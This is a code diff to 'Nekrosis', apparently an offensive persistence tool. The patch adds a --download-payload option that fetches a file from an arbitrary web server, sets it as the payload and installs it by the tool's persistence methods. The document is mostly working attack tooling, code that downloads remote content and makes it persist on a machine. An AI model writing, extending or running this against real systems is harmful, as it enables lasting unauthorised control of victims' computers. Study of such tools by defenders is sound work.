@@ -10,6 +10,7 @@ import sys
 import ctypes
 import logging
 import argparse
+import requests
 
 from pathlib import Path
 
@@ -163,6 +164,27 @@ class Nekrosis:
         self._payload = payload
         self.persistence_obj.payload = payload
 
+    def download_payload(self, payload: str) -> bool:
+        """
+        Download the payload from a webserver
+        """
+        try:
+            response = requests.get(payload)
+            if response.status_code == 200:
+                with open("download", "wb") as f:
+                    f.write(response.content)
+                logging.info("Payload downloaded successfully.")
+
+                self._payload = payload
+                self.persistence_obj.payload = payload
+                return True
+            else:
+                logging.error(f"Failed to download payload. Status code: {response.status_code}")
+                return False
+        except Exception as e:
+            logging.error(f"Error downloading payload: {e}")
+            return False
+
 
     def change_custom_method(self, custom_method: str) -> None:
         """
@@ -219,6 +241,7 @@ class Nekrosis:
             recommended_method=self.recommended_persistence_method(),
             export_method=method
         ).export()
+    
 
 
 def main():
@@ -260,26 +283,32 @@ def main():
         choices=[(format.value) for format in ExportPersistenceTypes],
         help="Export the supported persistence methods to STDOUT in the specified format."
     )
-
+    parser.add_argument(
+        "-dp",
+        "--download-payload",
+        help="Download a payload from a web server and use it as your payload."
+    )
 
     args = parser.parse_args()
 
-    nekrosis = Nekrosis(
-        payload=args.payload,
-        custom_method=args.method
-    )
-
-    if args.list_supported_methods or args.export:
-        if args.export:
-            print(nekrosis.export_persistence_methods(ExportPersistenceTypes(args.export)), end="")
-        else:
-            nekrosis._list_supported_persistence_methods()
+    if args.download_payload:
+        nekrosis = Nekrosis(payload=args.download_payload, custom_method=args.method)
+        if nekrosis.download_payload(args.download_payload):
+            nekrosis.change_payload("download")
+            nekrosis.install()
     else:
-        if not args.payload:
-            parser.print_help()
-            sys.exit(1)
-        nekrosis.install()
+        nekrosis = Nekrosis(payload=args.payload, custom_method=args.method)
 
+        if args.list_supported_methods or args.export:
+            if args.export:
+                print(nekrosis.export_persistence_methods(ExportPersistenceTypes(args.export)), end="")
+            else:
+                nekrosis._list_supported_persistence_methods()
+        else:
+            if not args.payload:
+                parser.print_help()
+                sys.exit(1)
+            nekrosis.install()
 
 if __name__ == "__main__":
     main()
